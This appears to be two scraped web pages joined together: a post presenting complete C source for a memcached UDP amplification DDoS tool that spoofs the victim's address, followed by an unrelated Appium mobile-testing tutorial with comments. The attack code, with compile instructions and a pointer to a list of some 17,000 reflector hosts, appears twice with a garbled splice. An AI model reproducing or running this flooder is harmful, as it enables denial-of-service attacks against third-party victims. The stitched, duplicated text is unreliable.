@@ -1,0 +1,3319 @@
+<tutorialjinni.com/>
+MenuShow Menu
+Memcached DDoS UDP Port Amplification Exploits POC
+Posted Under: DDOS, Exploit, Memcached, Source Code on Mar 8, 2018
+The Memcached vulnerability commonly know as Memcrashed and it is identified by CVE-2018-1000115 is a Distributed Denial of Service (DDOS) attack using UDP port. It works by sending a request from a spoofed IP address of few bytes to UDP port 11211 to a vulnerable server which return a humongous response, this amplification result in a massive DDOS attack. The Memcrashed attack is recorded at a whopping 1.7 TBps.
+Memcached, Memcrashed Vulnerability Patch fix can be found here.
+Memcached Exploit Proof of Concept Code
+/**
+memcached-PoC
+
+memcached Proof of Concept Amplification via spoofed source UDP packets. Repo includes source code for PoC and approximately 17,000 AMP hosts.
+
+memcached.c - Source code (https://pastebin.com/raw/ZiUeinae)
+memecache-amp-03-05-2018-rd.list - List of memcached servers as of 03-05-2018 (https://pastebin.com/raw/eSCHTTVu)
+
+Compile: gcc memcached.c -o memecached -pthread
+
+*Educational and/or testing purposes only. *Use of these tools against an unauthorized party may be unethtical, rude, and even illegal in some countries.
+
+**/
+
+/* 
+   memcache reflection script
+   greeting: syn, storm, krashed, chrono, spike, niko, disliked
+   Use with extreme Caution
+*/
+
+#include <time.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#define MAX_PACKET_SIZE 8192
+#define PHI 0x9e3779b9
+static uint32_t Q[4096], c = 362436;
+struct list
+{
+    struct sockaddr_in data;
+    struct list *next;
+    struct list *prev;
+};
+struct list *head;
+volatile int tehport;
+volatile int limiter;
+volatile unsigned int pps;
+volatile unsigned int sleeptime = 100;
+struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
+void init_rand(uint32_t x)
+{
+    int i;
+    Q[0] = x;
+    Q[1] = x + PHI;
+    Q[2] = x + PHI + PHI;
+    for (i = 3; i < 4096; i++)
+    {
+    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
+    }
+}
+uint32_t rand_cmwc(void)
+{
+    uint64_t t, a = 18782LL;
+    static uint32_t i = 4095;
+    uint32_t x, r = 0xfffffffe;
+    i = (i + 1) & 4095;
+    t = a * Q[i] + c;
+    c = (t >> 32);
+    x = t + c;
+    if (x < c) {
+    x++;
+    c++;
+    }
+    return (Q[i] = r - x);
+}
+unsigned short csum (unsigned short *buf, int nwords)
+{
+    unsigned long sum = 0;
+    for (sum = 0; nwords > 0; nwords--)
+    sum += *buf++;
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return (unsigned short)(~sum);
+}
+void setup_ip_header(struct iphdr *iph)
+{
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 15;
+    iph->id = htonl(54321);
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = IPPROTO_UDP;
+    iph->check = 0;
+    iph->saddr = inet_addr("192.168.3.100");
+}
+void setup_udp_header(struct udphdr *udph)
+{
+    udph->source = htons(5678);
+    udph->dest = htons(11211);
+    udph->check = 0;
+    memcpy((void *)udph + sizeof(struct udphdr), "x00x01x00x00x00x01x00x00statsrn", 15);
+    udph->len=htons(sizeof(struct udphdr) + 15);
+}
+void *flood(void *par1)
+{
+    struct thread_data *td = (struct thread_data *)par1;
+    char datagram[MAX_PACKET_SIZE];
+    struct iphdr *iph = (struct iphdr *)datagram;
+    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
+    struct sockaddr_in sin = td->sin;
+    struct  list *list_node = td->list_node;
+    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if(s < 0){
+    fprintf(stderr, "Could not open raw socket.n");
+    exit(-1);
+    }
+    init_rand(time(NULL));
+    memset(datagram, 0, MAX_PACKET_SIZE);
+    setup_ip_header(iph);
+    setup_udp_header(udph);
+    udph->source = htons(rand() % 65535 - 1026);
+    iph->saddr = sin.sin_addr.s_addr;
+    iph->daddr = list_node->data.sin_addr.s_addr;
+    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+    int tmp = 1;
+    const int *val = &tmp;
+    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
+    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!n");
+    exit(-1);
+    }
+    init_rand(time(NULL));
+    register unsigned int i;
+    i = 0;
+    while(1){
+        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
+        list_node = list_node->next;
+        iph->daddr = list_node->data.sin_addr.s_addr;
+        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
+        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+        
+        pps++;
+        if(i >= limiter)
+        {
+            i = 0;
+            usleep(sleeptime);
+        }
+        i++;
+    }
+}
+int main(int argc, char *argv[ ])
+{
+    if(argc < 6){
+    fprintf(stderr, "Invalid parameters!n");
+    fprintf(stdout, "Usage: %s <target IP> <port> <reflection file> <threads> <pps limiter, -1 for no limit> <time>n", argv[0]);
+        exit(-1);
+    }
+    srand(time(NULL));
+    int i = 0;
+    head = NULL;
+    fprintf(stdout, "Setting up sockets...n");
+    int max_len = 128;
+    char *buffer = (char *) malloc(max_len);
+    buffer = memset(buffer, 0x00, max_len);
+    int num_threads = atoi(argv[4]);
+    int maxpps = atoi(argv[5]);
+    limiter = 0;
+    pps = 0;
+    int multiplier = 20;
+    FILE *list_fd = fopen(argv[3],  "r");
+    while (fgets(buffer, max_len, list_fd) != NULL) {
+        if ((buffer[strlen(buffer) - 1] == 'n') ||
+                (buffer[strlen(buffer) - 1] == 'r')) {
+            buffer[strlen(buffer) - 1] = 0x00;
+            if(head == NULL)
+            {
+                head = (struct list *)malloc(sizeof(struct list));
+                bzero(&head->data, sizeof(head->data));
+                head->data.sin_addr.s_addr=inet_addr(buffer);
+                head->next = head;
+                head->prev = head;
+            } else {
+                struct list *new_node = (struct list *)malloc(sizeof(struct list));
+                memset(new_node, 0x00, sizeof(struct list));
+                new_node->data.sin_addr.s_addr=inet_addr(buffer);
+                new_node->prev = head;
+                new_node->next = head->next;
+                head->next = new_node;
+            }
+            i++;
+        } else {
+            continue;
+        }
+    }
+    struct list *current = head->next;
+    pthread_t thread[num_threads];
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_addr.s_addr = inet_addr(argv[1]);
+    struct thread_data td[num_threads];
+    for(i = 0;i<num_threads;i++){
+        td[i].thread_id = i;
+        td[i].sin= sin;
+        td[i].list_node = current;
+        pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
+    }
+    fprintf(stdout, "Starting flood...n");
+    for(i = 0;i<(atoi(argv[6])*multiplier);i++)
+    {
+        usleep((1000/multiplier)*1000);
+        if((pps*multiplier) > maxpps)
+        {
+            if(1 > limiter)
+            {
+                sleeptime+=100;
+            } else {
+                limiter--;
+            }
+        } else {
+            limiter++;
+            if(sleeptime > 25)
+            {
+                sleeptime-=25;
+            } else {
+                sleeptime = 0;
+            }
+        }
+        pps = 0;
+    }
+    return 0;
+}
+Memcached DDoS UDP Port Amplification Exploits POC
+Posted Under: DDOS, Exploit, Memcached, Source Code on Mar 8, 2018
+The Memcached vulnerability commonly know as Memcrashed and it is identified by CVE-2018-1000115 is a Distributed Denial of Service (DDOS) attack using UDP port. It works by sending a request from a spoofed IP address of few bytes to UDP port 11211 to a vulnerable server which return a humongous response, this amplification result in a massive DDOS attack. The Memcrashed attack is recorded at a whopping 1.7 TBps.
+Memcached, Memcrashed Vulnerability Patch fix can be found here.
+Memcached Exploit Proof of Concept Code
+/**
+memcached-PoC
+
+memcached Proof of Concept Amplification via spoofed source UDP packets. Repo includes source code for PoC and approximately 17,000 AMP hosts.
+
+memcached.c - Source code (https://pastebin.com/raw/ZiUeinae)
+memecache-amp-03-05-2018-rd.list - List of memcached servers as of 03-05-2018 (https://pastebin.com/raw/eSCHTTVu)
+
+Compile: gcc memcached.c -o memecached -pthread
+
+*Educational and/or testing purposes only. *Use of these tools against an unauthorized party may be unethtical, rude, and even illegal in some countries.
+
+**/
+
+/* 
+   memcache reflection script
+   greeting: syn, storm, krashed, chrono, spike, niko, disliked
+   Use with extreme Caution
+*/
+
+#include <time.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#define MAX_PACKET_SIZE 8192
+#define PHI 0x9e3779b9
+static uint32_t Q[4096], c = 362436;
+struct list
+{
+    struct sockaddr_in data;
+    struct list *next;
+    struct list *prev;
+};
+struct list *head;
+volatile int tehport;
+volatile int limiter;
+volatile unsigned int pps;
+volatile unsigned int sleeptime = 100;
+struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
+void init_rand(uint32_t x)
+{
+    int i;
+    Q[0] = x;
+    Q[1] = x + PHI;
+    Q[2] = x + PHI + PHI;
+    for (i = 3; i < 4096; i++)
+    {
+    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
+    }
+}
+uint32_t rand_cmwc(void)
+{
+    uint64_t t, a = 18782LL;
+    static uint32_t i = 4095;
+    uint32_t x, r = 0xfffffffe;
+    i = (i + 1) & 4095;
+    t = a * Q[i] + c;
+    c = (t >> 32);
+    x = t + c;
+    if (x < c) {
+    x++;
+    c++;
+    }
+    return (Q[i] = r - x);
+}
+unsigned short csum (unsigned short *buf, int nwords)
+{
+    unsigned long sum = 0;
+    for (sum = 0; nwords > 0; nwords--)
+    sum += *buf++;
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return (unsigned short)(~sum);
+}
+void setup_ip_header(struct iphdr *iph)
+{
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 15;
+    iph->id = htonl(54321);
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = IPPROTO_UDP;
+    iph->check = 0;
+    iph->saddr = inet_addr("192.168.3.100");
+}
+void setup_udp_header(struct udphdr *udph)
+{
+    udph->source = htons(5678);
+    udph->dest = htons(11211);
+    udph->check = 0;
+    memcpy((void *)udph + sizeof(struct udphdr), "x00x01x00x00x00x01x00x00statsrn", 15);
+    udph->len=htons(sizeof(struct udphdr) + 15);
+}
+void *flood(void *par1)
+{
+    struct thread_data *td = (struct thread_data *)par1;
+    char datagram[MAX_PACKET_SIZE];
+    struct iphdr *iph = (struct iphdr *)datagram;
+    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
+    struct sockaddr_in sin = td->sin;
+    struct  list *list_node = td->list_node;
+    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if(s < 0){
+    fprintf(stderr, "Could not open raw socket.n");
+    exit(-1);
+    }
+    init_rand(time(NULL));
+    memset(datagram, 0, MAX_PACKET_SIZE);
+    setup_ip_header(iph);
+    setup_udp_header(udph);
+    udph->source = htons(rand() % 65535 - 1026);
+    iph->saddr = sin.sin_addr.s_addr;
+    iph->daddr = list_node->data.sin_addr.s_addr;
+    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+    int tmp = 1;
+    const int *val = &tmp;
+    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
+    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!n");
+    exit(-1);
+    }
+    init_rand(time(NULL));
+    register unsigned int i;
+    i = 0;
+    
+set HDRINCL!n");
+    exit(-1);
+    }
+    init_rand(time(NULL));
+    register unsigned int i;
+    i = 0;
+    while(1){
+        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
+        list_node = list_node->next;
+        iph->daddr = list_node->data.sin_addr.s_addr;
+        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
+        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+        
+        pps++;
+        if(i >= limiter)
+        {
+            i = 0;
+            usleep(sleeptime);
+        }
+        i++;
+    }
+}
+int main(int argc, char *argv[ ])
+{
+    if(argc < 6){
+    fprintf(stderr, "Invalid parameters!n");
+    fprintf(stdout, "Usage: %s <target IP> <port> <reflection file> <threads> <pps limiter, -1 for no limit> <time>n", argv[0]);
+        exit(-1);
+    }
+    srand(time(NULL));
+    int i = 0;
+    head = NULL;
+    fprintf(stdout, "Setting up sockets...n");
+    int max_len = 128;
+    char *buffer = (char *) malloc(max_len);
+    buffer = memset(buffer, 0x00, max_len);
+    int num_threads = atoi(argv[4]);
+    int maxpps = atoi(argv[5]);
+    limiter = 0;
+    pps = 0;
+    int multiplier = 20;
+    FILE *list_fd = fopen(argv[3],  "r");
+    while (fgets(buffer, max_len, list_fd) != NULL) {
+        if ((buffer[strlen(buffer) - 1] == 'n') ||
+                (buffer[strlen(buffer) - 1] == 'r')) {
+            buffer[strlen(buffer) - 1] = 0x00;
+            if(head == NULL)
+            {
+                head = (struct list *)malloc(sizeof(struct list));
+                bzero(&head->data, sizeof(head->data));
+                head->data.sin_addr.s_addr=inet_addr(buffer);
+                head->next = head;
+                head->prev = head;
+            } else {
+                struct list *new_node = (struct list *)malloc(sizeof(struct list));
+                memset(new_node, 0x00, sizeof(struct list));
+                new_node->data.sin_addr.s_addr=inet_addr(buffer);
+                new_node->prev = head;
+                new_node->next = head->next;
+                head->next = new_node;
+            }
+            i++;
+        } else {
+            continue;
+        }
+    }
+    struct list *current = head->next;
+    pthread_t thread[num_threads];
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_addr.s_addr = inet_addr(argv[1]);
+    struct thread_data td[num_threads];
+    for(i = 0;i<num_threads;i++){
+        td[i].thread_id = i;
+        td[i].sin= sin;
+        td[i].list_node = current;
+        pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
+    }
+    fprintf(stdout, "Starting flood...n");
+    for(i = 0;i<(atoi(argv[6])*multiplier);i++)
+    {
+        usleep((1000/multiplier)*1000);
+        if((pps*multiplier) > maxpps)
+        {
+            if(1 > limiter)
+            {
+                sleeptime+=100;
+            } else {
+                limiter--;
+            }
+        } else {
+            limiter++;
+            if(sleeptime > 25)
+            {
+                sleeptime-=25;
+            } else {
+                sleeptime = 0;
+            }
+        }
+        pps = 0;
+    }
+    return 0;
+}
+Another POC of Memcached DDoS UDP Port Amplification Attack can be found on Exploit DB, check it here.
+Related Posts
+Drupalgeddon2 RCE Exploit CVE-2018-7600        
+Drupalgeddon2 RCE Exploit CVE-2018-7600
+Back in 2014, a SQLi in Drupal was discovered so serious that in a ma...
+Memcached DDoS Attack Patch fix        
+Memcached DDoS Attack Patch fix
+Memcrashed (CVE-2018-1000115), a vulnerability of popular cache Memca...
+SMBv3 Null Dereference Denial of Service Vulnerability (CVE-2018-0833)        
+SMBv3 Null Dereference Denial of Service Vulnerability (CVE-2018-0833)
+CVE-2018-0833 is the new vulnerability in Microsoft windows Server Me...
+Spectre Exploit Download for Windows        
+Spectre Exploit Download for Windows
+Spectre is a vulnerability that affects modern microprocessors that p...
+Spectre Exploit Download for Linux        
+Spectre Exploit Download for Linux
+Spectre is a hardware design flaw in the architectures of Intel, AMD,...
+njRAT Malware Sample Download        
+njRAT Malware Sample Download
+njRAT is one of the oldest and popular remote access trojan (RAT) in t...
+BlackNET RAT Download        
+BlackNET RAT Download
+BlackNET RAT is a modern open source remote access Trojan written in ...
+BlackSquid Malware Sample Download        
+BlackSquid Malware Sample Download
+Information security company Trend Micro said it had found a new famil...
+© Tutorial Jinni
+
+
+Skip to content
+Software Test Academy
+Menu
+appium
+Appium Tutorial Step by Step Appium Automation [2021 Update]
+October 15, 2021 by Onur Baskirt
+Appium Tutorial 2021 is ready for all testers! I will use Appium Desktop and Android Studio to create a sample mobile test automation project for you. After that, we will continue with the Advance Appium Tutorial series. First,  we need to do a proper Appium Installation. Alright, Let’s start!
+
+Appium Tutorial Prerequisites: JAVA and Maven Installation
+Download JAVA JDK first. Here is the Link: JAVA JDK 11
+
+Installation steps and configuration settings have described in this article at step-4 and step-5. 
+
+For MACOS users please visit the below article for all installation needs. 
+
+https://www.swtestacademy.com/how-to-install-appium-on-mac/
+
+Windows users will go on with the below installation steps. ;)
+
+Android Studio Installation 
+Let’s go to Android Studio Download and install Android Studio. After that, apply the following steps. Click the “Next” icons and finally click the “Finish“.
+
+android-studio-download-page
+
+Click to download Android Studio based on your operating system Windows, macOS, Chrome OS, or Linux. We are going on with Windows.
+
+After download the Android Studio, installation is straightforward. Click the next button.
+
+appium download
+
+Select all options and click the next button.
+
+appium server
+
+Select your directory or keep the default and click next. I kept it as default. ;)
+
+appium desktop
+
+and click the install button to start the installation process.
+
+appium
+
+If it is your first time installing Android Studio then just select the “Do not import settings” option and click the OK button. If you are updating it, you can import your previous settings.
+
+appium interview questions
+
+Click the next button and continue.
+
+appium capabilities
+
+I installed the Android Studio with standard settings and configurations as shown below screenshot.
+
+appium api
+
+Select your UI Theme. I prefer Darcula because it is better for the eyes but you can go with the white classical theme if you want.
+
+appium tutorial ios
+
+Click the “Finish” button and install the required tools.
+
+appium tutorial java
+
+Then, just wait until all libraries to be downloaded and the installation to be finished.
+
+appium tutorial android
+
+After all these steps, click the finish button.
+
+appium tutorial
+
+After clicking the “Finish” button. Go to “Configure” > “SDK Manager” to get SDK information. It is required for Android SDK path settings.
+
+
+
+Select your device’s or emulator’s Android API level (Version). We will go with Android 11 API, please install that one.
+
+When took the below screenshot the latest version was 9.0 but for this example, we will go with Android 11. I am not using windows anymore thus I could not update the screenshot but I wanted to mention it to guide you correctly.
+
+
+
+And select the required tools as shown below and click “OK.
+
+appium inspector
+
+Click OK one more time, please. ;)
+
+ios testing
+
+Click the Finish button and continue.
+
+ios automation
+
+After the installation of the required tools, go to the SDK Manager page and copy the SDK path as shown below. We will use it. ;)
+
+android automation
+
+Download RapidEE tool and install it and open it as administrator. 
+
+android testing
+
+And then add ANDROID_HOME variable and its path should be Android SDK’s path. Also, check your JAVA_HOME variable. JAVA_HOME should equal to JAVA SDK’s path.
+
+uiautomator
+
+Then, you need to add required Android tools and JAVA JRE paths to your system path as shown below.
+
+selendroid
+
+After that, check your settings and installations. Open a command prompt window and type “sdkmanager –list” command as shown below.
+
+mobile automation
+
+and type “uiautomatorviewer” to check uiautomatorviewer is working properly.
+
+mobile testing tools
+
+Then, create a sample project in Android Studio and then click the link as shown below to install missing libraries.
+
+what is appium
+
+After installation, click the Finish button.
+
+download appium
+
+After installing missing libraries you will see the device and little and sweet android icon. :) When you click this icon, you will open the android virtual device manager.
+
+install appium
+
+Let’s create a virtual device. I will also explain how to do mobile automation with a real device too. Don’t worry. ;) Click to “+ Create a Virtual Device” button.
+
+apium
+
+Then, select a virtual device in the device list.
+
+To run ARM-based apk files on X86 platforms (windows or mac),
+please refer to this article: https://www.swtestacademy.com/how-to-run-arm-apk-on-x86-systems/
+
+After coming back to the above article and after installing your device, you will see the below result.
+
+
+
+Until now, we installed JAVA and Android-related libraries and did their settings and configurations. Now, it is time to download Appium.
+
+Appium Desktop Installation and Configurations
+Go to http://appium.io/downloads.html and click the “Appium-Desktop for OSX, Windows, and Linux” link.
+
+download appium
+
+On the below page, click “appium-desktop-Setup-1.20.2.exe” file. (I am writing this article the latest release is 1.20.2, you can install the latest version when you are installing appium.)
+
+appium-desktop-versions
+
+When the installation file downloaded, click run and start to install appium desktop.
+
+install appium
+
+When installation finished, double-click the appium icon and open the appium server as shown below.
+
+appium-desktop-welcome-screen
+
+Let’s click the “Advanced” tab and change the Server Address to “127.0.0.1” and click Allow Session Override for override session when there will be problems and click “Start Server”. If you will use a real device and then use “0.0.0.0” for “Server Adress”.
+
+appium-desktop-settings
+
+Set Android and JAVA home in Appium Desktop.
+
+android-home-settings
+
+Give the required permission to Appium Server.
+
+
+
+You will see the server up and running.
+
+appium-desktop-working
+
+Android Virtual Device and Pre-Test Settings
+Before starting the tests you can directly install your apk or xapk files if you have. In our example, first, we will install apk pure app.
+
+After please open the apk pure app and search for any app you want to install. In this example, I will go with the “Isin Olsun” application. My previous company’s app. :-)
+
+
+
+After clicking the install button, the app will be installed.
+
+
+
+After these steps, when you click the app icon, you will see that it is opening as expected. :)
+
+
+
+In order to find the splash activity, I installed the APK Info app via APK Pure application. For this, just open the APK pure app, search the “Apk Info” and install the app.
+
+Then, I opened the APK Info app and find our application “İşin Olsun” and click it.
+
+Then I saw all the information about our app. When I looked at the Activities section, I saw that our application is starting with “com.isinolsun.app.activities.SplashActivity“. I will use this info in the automation code’s desired capabilities section. Also, I will use app package info which is “com.isinolsun.com“
+
+android-activities
+
+Then, open a command prompt and write “adb devices” command to see connected devices and get the device ID as shown below.
+
+mobile devices in automation
+
+Go to your AVD’s setting tab and check your AVD’s Android Version as shown below. We will use these settings in our test project.
+
+android-version
+
+Then, open IntelliJ IDE and create a new project as shown below. First, select Maven and click Next button.
+
+appium project
+
+Then, write your project’s GroupId and ArtifactId. You can write the same as shown below. It does not affect anything, just naming.
+
+project appium
+
+Then, give a name to your project.
+
+test automation
+
+Then, click “Enable Auto-Import” in the right bottom corner.
+
+mobile testing
+
+Go to mvnrepository.com website and get all frameworks’ latest dependency information. We will use TestNG, Appium, Selenium.
+
+Our POM.xml will look like as below. You can see appium’s, selenium’s, and TestNG’s dependencies. I used JAVA11 JDK in this example.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+    <groupId>io-appium</groupId>
+    <artifactId>io-appium</artifactId>
+    <version>1.0-SNAPSHOT</version>
+    <build>
+        <plugins>
+            <plugin>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-compiler-plugin</artifactId>
+                <configuration>
+                    <source>11</source>
+                    <target>11</target>
+                </configuration>
+            </plugin>
+        </plugins>
+    </build>
+    <dependencies>
+        <!-- https://mvnrepository.com/artifact/io.appium/java-client -->
+        <dependency>
+            <groupId>io.appium</groupId>
+            <artifactId>java-client</artifactId>
+            <version>7.5.1</version>
+        </dependency>
+        <!-- https://mvnrepository.com/artifact/org.seleniumhq.selenium/selenium-java -->
+        <dependency>
+            <groupId>org.seleniumhq.selenium</groupId>
+            <artifactId>selenium-java</artifactId>
+            <version>3.141.59</version>
+        </dependency>
+        <!-- https://mvnrepository.com/artifact/org.testng/testng -->
+        <dependency>
+            <groupId>org.testng</groupId>
+            <artifactId>testng</artifactId>
+            <version>7.4.0</version>
+            <scope>test</scope>
+        </dependency>
+    </dependencies>
+</project>
+Create a new Java Class as shown below and give a name to your test class. For now, keep it empty, after emulator settings, we will come back to test code at the end of the article.
+
+android testing
+
+Now, let’s start the emulator get your device’s information from the android studio as shown below.
+
+android-virtual-device-selection
+
+After starting the application on the emulator, go to the server and click the magnifier icon to open the inspector.
+
+appium-server-magnifier
+
+Then, start to enter the capabilities of your device as shown below in the inspector.
+
+desired-capabilities-appium-inspector
+
+{
+  "deviceName": "Pixel XL API 30",
+  "platformName": "Android",
+  "automationName": "UiAutomator2",
+  "platformVersion": "11",
+  "skipUnlock": "false"
+}
+Also, you can save these settings and use them later.
+
+appium-desired-capabilities
+
+and click “Start Session” to start the inspector session to get your mobile elements ids. Get mobile element’s id’s as shown below. We will use them for our first mobile automation project.
+
+appium-inspector
+
+After all of these steps, we need to write our test automation code.
+
+How to Use Real Device instead of Emulator
+In emulators, you may face some problems. When I tried to run my test on the emulator XPath locators did not work. Normally, I did not want to use XPath but in our app some for some elements I did not have other options. Then, I tried the same test on a real device, my test worked flawlessly and very fast. Thus, I suggest you use real devices instead of emulators. In order to use the real device we should do the followings:
+
+Connect your real device to your laptop via a USB port.
+Go to Settings > Developer Settings and enable the USB Debugging option.
+Open the command prompt and type “adb devices” command and get your device ID.
+appium
+
+Mobile Test Automation Project by Using Appium and TestNG
+It is time to write some code for our Appium Tutorial. The test code of the project is shown below. I added inline comments. The most critical part is DesiredCapabilities, the rest of the code is very similar to Selenium and TestNG test automation codes. Also, you can find this project on GitHub.
+
+Project’s GitHub URL: https://github.com/swtestacademy/appium-sample-test
+
+Below code opens İsinOlsun app, skips splash screen, clicks “job search” button, then accepts notifications and then clicks the second job on the main screen and that’s all. :) It is easy because it is our first test case.
+
+import io.appium.java_client.MobileElement;
+import io.appium.java_client.android.AndroidDriver;
+import java.net.MalformedURLException;
+import java.net.URL;
+import org.openqa.selenium.By;
+import org.openqa.selenium.remote.DesiredCapabilities;
+import org.openqa.selenium.support.ui.ExpectedConditions;
+import org.openqa.selenium.support.ui.WebDriverWait;
+import org.testng.Assert;
+import org.testng.annotations.AfterMethod;
+import org.testng.annotations.BeforeMethod;
+import org.testng.annotations.Test;
+public class ioSampleTest {
+    public AndroidDriver<MobileElement> driver;
+    public WebDriverWait                wait;
+    //Elements By
+    By jobsBy           = By.id("com.isinolsun.app:id/rootRelativeView");
+    By allowWhenUsingBy = By.id("com.android.permissioncontroller:id/permission_allow_foreground_only_button");
+    By searchingJobBy   = By.id("com.isinolsun.app:id/bluecollar_type_button");
+    By animationBy      = By.id("com.isinolsun.app:id/animation_view");
+    By toolBarTitleBy   = By.id("com.isinolsun.app:id/toolbarTitle");
+    @BeforeMethod
+    public void setup() throws MalformedURLException {
+        DesiredCapabilities caps = new DesiredCapabilities();
+        caps.setCapability("deviceName", "Pixel XL API 30");
+        caps.setCapability("udid", "emulator-5554"); //DeviceId from "adb devices" command
+        caps.setCapability("platformName", "Android");
+        caps.setCapability("platformVersion", "11.0");
+        caps.setCapability("skipUnlock", "true");
+        caps.setCapability("appPackage", "com.isinolsun.app");
+        caps.setCapability("appActivity", "com.isinolsun.app.activities.SplashActivity");
+        caps.setCapability("noReset", "false");
+        driver = new AndroidDriver<MobileElement>(new URL("http://127.0.0.1:4723/wd/hub"), caps);
+        wait = new WebDriverWait(driver, 10);
+    }
+    @Test
+    public void basicTest() throws InterruptedException {
+        //Click and pass Splash
+        wait.until(ExpectedConditions.visibilityOfElementLocated(animationBy)).click();
+        //Click I am searching a job
+        wait.until(ExpectedConditions.visibilityOfElementLocated(searchingJobBy)).click();
+        //Notification Allow
+        if (wait.until(ExpectedConditions.visibilityOfElementLocated(allowWhenUsingBy)).isDisplayed()) {
+            wait.until(ExpectedConditions.visibilityOfElementLocated(allowWhenUsingBy)).click();
+        }
+        //Click Second Job
+        wait.until(ExpectedConditions.visibilityOfAllElementsLocatedBy(jobsBy)).get(1).click();
+        //Do a simple assertion
+        String toolBarTitleStr = wait.until(ExpectedConditions.visibilityOfElementLocated(toolBarTitleBy)).getText();
+        Assert.assertTrue(toolBarTitleStr.toLowerCase().contains("detay"));
+    }
+    @AfterMethod
+    public void teardown() {
+        driver.quit();
+    }
+}
+Then, run the test.
+
+
+
+And the test should pass as shown below screenshot.
+
+
+
+That’s all for this Appium Tutorial. I hope you successfully installed and configured all settings and run your mobile automation code.
+
+If you have any questions please write a comment, me or another expert will try to help you.
+
+GitHub Project
+https://github.com/swtestacademy/appium-sample-test
+
+Other Appium Tutorials
+Now, you can learn Appium Parallel Testing and How to set up your Own Wireless Mobile Device Farm!
+
+Appium Parallel Testing on Real Devices
+
+Appium Parallel Testing on Multiple Emulators
+
+Appium Cucumber TestNG with Parallel Test Execution
+
+Do you want to learn Appium Actions such as Tab, MultiTouch, Press, Swipe?
+
+Appium Mobile Actions
+
+I hope you like this article if you like it or if you have any troubles please share your comments with us. 
+
+Thanks.
+Onur Baskirt
+
+onur baskirt
+Onur Baskirt
+Onur Baskirt is a senior IT professional with 15+ years of experience. Now, he is working as a Senior Technical Consultant at Emirates Airlines in Dubai.
+
+CategoriesAppium Tutorials
+Tagsappium
+Post navigation
+How to Install Appium on Mac OS with Required Tools [2021]
+How to Select a Date from DatePicker in Selenium [2021]
+101 thoughts on “Appium Tutorial Step by Step Appium Automation [2021 Update]”
+
+Mayur Karnik
+February 16, 2018 at 7:21 am
+Hey Onur…such a great tutorial by u…very well described and easy to understand. Can u make a tutorial on how to setup appium(not desktop) on mac with latest release. a step by step guide to install appium and run sample code. it would help me or might other people who are working on mac a lot. Thanks in advance
+
+Reply
+
+Onur Baskirt
+February 16, 2018 at 9:48 am
+Hi Mayur, I would like to but I don’t have MAC. :( When I have one, I will do it. But it is not so hard. You can install appium with npm and use it with below command. Please also check this article. http://www.swtestacademy.com/appium-parallel-tests/ and go to “Alternative Way | Appium with Node.js”
+
+Reply
+
+Mayur Karnik
+February 21, 2018 at 4:05 pm
+Thanks Onur for your quick response…i will check and let u know. And i am very excited to perform http://www.swtestacademy.com/appium-parallel-tests this article at my end.
+
+Reply
+
+Onur Baskirt
+February 25, 2018 at 11:46 pm
+Welcome :) and Good Luck! ;)
+
+Reply
+
+Mayur Karnik
+February 26, 2018 at 10:32 am
+Hey Onur,
+i was able to perform successfully the article “http://www.swtestacademy.com/appium-parallel-tests” on Windows but not on MAC. can u help me out
+
+
+Onur Baskirt
+June 20, 2018 at 1:19 am
+On MAC what kind of problem did you face? CAnberk Akduygu has MAC, I do not have. He may help you. ;)
+
+Reply
+
+Ufuk Coskun
+February 21, 2018 at 1:52 pm
+Great article, we’re waiting more Turkish versions for other articles :)
+
+Reply
+
+Onur Baskirt
